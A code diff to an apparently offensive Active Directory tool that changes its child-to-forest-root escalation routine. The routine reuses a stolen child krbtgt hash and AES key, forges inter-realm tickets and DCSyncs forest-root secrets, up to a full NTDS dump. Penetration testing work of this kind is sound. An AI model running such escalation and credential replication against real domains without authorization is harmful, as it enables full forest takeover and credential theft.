@@ -1690,12 +1690,20 @@ def run_enum_adcs_privs(
         print_exception(show_locals=False, exception=e)
 
 
-def run_raise_child(shell: Any, *, domain: str, username: str, password: str) -> None:
+def run_raise_child(shell: Any, *, domain: str, username: str, password: str) -> Any:
     """Escalate from a child domain to the forest root using the native skelsec stack.
 
     Uses ``raise_child_native`` (kerbad + aiosmb DRSUAPI + native ticket forging).
     No subprocess, no impacket dependency at runtime.  Survives NTLM-disabled,
     AES-only, and signing-required environments.
+
+    Returns the ``RaiseChildNativeOutcome`` on completion (whether success or a
+    handled failure) so callers that need a reliable success/failure signal — the
+    attack-path execution dispatch — can read ``outcome.success`` without
+    duplicating any of the credential-surfacing / credential-store logic below.
+    Returns ``None`` only on an early prerequisite failure (domain not
+    initialized, no parent, missing PDC IP) or an unexpected exception. Existing
+    interactive callers ignore the return value.
     """
     from adscan_internal.services.exploitation import ExploitationService
 
@@ -1703,7 +1711,7 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
         if domain not in shell.domains_data:
             marked_domain = mark_sensitive(domain, "domain")
             print_error(f"Domain {marked_domain} is not initialized in this session.")
-            return
+            return None
 
         parts = domain.split(".", 1)
         if len(parts) < 2 or parts[1] not in shell.domains_data:
@@ -1712,7 +1720,7 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
                 f"Cannot identify a parent domain for {marked_domain}. "
                 "raise_child requires the parent (forest root) domain to be initialized first."
             )
-            return
+            return None
 
         parent_domain = parts[1]
         child_dc_ip = shell.domains_data[domain].get("pdc")
@@ -1722,7 +1730,7 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
                 "Missing PDC IP for child or parent domain. "
                 "Re-run domain initialization."
             )
-            return
+            return None
 
         child_dc_hostname = shell.domains_data[domain].get("pdc_hostname")
         parent_dc_hostname = shell.domains_data[parent_domain].get("pdc_hostname")
@@ -1743,6 +1751,35 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
             f"[raise_child] native escalation: {marked_child} -> {marked_parent}"
         )
 
+        # RaiseChild only fires because the child is already ``auth=pwned`` — its
+        # krbtgt was DCSync'd minutes earlier by the compromise that unlocked this
+        # escalation. Reuse that already-extracted key so Step 3 does NOT replicate
+        # krbtgt a second time (the redundant single-object replicate that
+        # intermittently fails with ERROR_DS_DRA_BAD_DN). Read the NT hash from the
+        # credential store (``credentials["krbtgt"]`` is the scalar NT-hash secret)
+        # and the AES-256 key from the credential-store meta SSOT
+        # (``credentials_meta["krbtgt"]["aes256_key"|"aes256"]``). Best-effort: any
+        # miss leaves both None and Step 3 falls back to the DCSync path.
+        child_krbtgt_nt_hash: str | None = None
+        child_krbtgt_aes256: str | None = None
+        try:
+            child_creds = (shell.domains_data.get(domain, {}) or {}).get("credentials", {}) or {}
+            stored_krbtgt = child_creds.get("krbtgt")
+            if isinstance(stored_krbtgt, str) and shell.is_hash(stored_krbtgt):
+                child_krbtgt_nt_hash = stored_krbtgt.strip() or None
+            from adscan_internal.services.credentials.privilege_role import (
+                get_credential_meta,
+            )
+
+            krbtgt_meta = get_credential_meta(shell, domain=domain, username="krbtgt")
+            if isinstance(krbtgt_meta, dict):
+                aes_stored = krbtgt_meta.get("aes256_key") or krbtgt_meta.get("aes256")
+                if isinstance(aes_stored, str) and aes_stored.strip():
+                    child_krbtgt_aes256 = aes_stored.strip()
+        except Exception:  # noqa: BLE001
+            child_krbtgt_nt_hash = None
+            child_krbtgt_aes256 = None
+
         service = ExploitationService()
         result = service.persistence.raise_child_native(
             child_domain=domain,
@@ -1754,6 +1791,8 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
             nt_hash=nt_hash_arg,
             child_dc_hostname=child_dc_hostname,
             parent_dc_hostname=parent_dc_hostname,
+            child_krbtgt_nt_hash=child_krbtgt_nt_hash,
+            child_krbtgt_aes256=child_krbtgt_aes256,
         )
 
         if not result.success:
@@ -1772,7 +1811,7 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
                     f"User: {marked_username}, NT Hash: {marked_nt_hash}"
                 )
                 shell.add_credential(cred["domain"], cred["username"], cred["nt_hash"], credential_origin="dcsync")
-            return
+            return result
 
         # Success: surface all credentials and the forged ccache path.
         for cred in result.credentials:
@@ -1789,15 +1828,78 @@ def run_raise_child(shell: Any, *, domain: str, username: str, password: str) ->
                 f"[raise_child] inter-realm ccache: {result.forged_ticket_path}"
             )
 
+        # --- Forest-root loot DCSync via the generic DCSync path ---------------
+        # The escalation itself is proven: the service obtained a cross-realm
+        # ``cifs/<parent_dc>@PARENT`` TGS authenticating us as the SID-history
+        # Enterprise Admin (``result.parent_ccache_path``). Now replicate the
+        # forest-root credentials through the SAME generic native DCSync every
+        # other DCSync uses, so the operator gets the standard target selector
+        # (full directory / krbtgt only / a specific admin) instead of the old
+        # hardcoded "krbtgt + Administrator only". Routing through
+        # ``execute_dcsync_native`` also promotes the parent domain to ``pwned``
+        # via the DA-controlled promotion SSOT (a successful DRSUAPI replication
+        # of a Tier-0 secret is proof of DA-level control), and persists every
+        # replicated credential itself — so we neither double-persist nor lose
+        # anything downstream readers of the outcome relied on.
+        parent_ccache = result.parent_ccache_path
+        if parent_ccache:
+            from adscan_internal.cli.kerberos import _resolve_dcsync_target_user
+            from adscan_internal.cli.secretsdump import execute_dcsync_native
+
+            # Selector: default "All" (auto-resolved to a full dump in a
+            # non-interactive run), "krbtgt" for krbtgt-only, or a specific DA.
+            target_user_raw = _resolve_dcsync_target_user(
+                shell, domain=parent_domain
+            )
+            target_user = (target_user_raw or "").strip()
+            if not target_user:
+                # Operator cancelled the selector — the escalation still
+                # succeeded; skip the loot dump and report success.
+                print_info(
+                    "raise_child: forest-root replication cancelled by operator; "
+                    "escalation proven, no secrets replicated."
+                )
+            else:
+                # Same mapping as the interactive DCSync call site
+                # (cli/kerberos.py): None means the full NTDS walk.
+                target_users_for_native: list[str] | None = (
+                    None if target_user.casefold() == "all" else [target_user]
+                )
+                # Inject the forged parent ccache through the context seam. The
+                # ``.ccache`` suffix on the ``password`` field routes it to the
+                # explicit-ccache (slot-1) branch of execute_dcsync_native, which
+                # is exempt from the principal guard by design (a minted service
+                # ticket). ``auth_domain`` stays the CHILD domain so the cross-
+                # realm bind follows the referral, mirroring the removed Step 6.
+                previous_context = getattr(shell, "_current_dcsync_context", None)
+                shell._current_dcsync_context = {
+                    "domain": parent_domain,
+                    "username": username,
+                    "password": parent_ccache,
+                    "target_user": target_user,
+                    "retry_attempted": False,
+                }
+                try:
+                    execute_dcsync_native(
+                        shell,
+                        domain=parent_domain,
+                        auth_domain=domain,
+                        target_users=target_users_for_native,
+                    )
+                finally:
+                    shell._current_dcsync_context = previous_context
+
         print_success(
             f"Escalation completed. {marked_child} -> forest root "
             f"{marked_parent} (admin: {result.parent_administrator or 'Administrator'})."
         )
+        return result
 
     except Exception as e:
         telemetry.capture_exception(e)
         print_error("Error executing raise_child.")
         print_exception(show_locals=False, exception=e)
+        return None
 
 
 def run_enum_cross_domain_acl(shell: Any, *, domain: str) -> None:
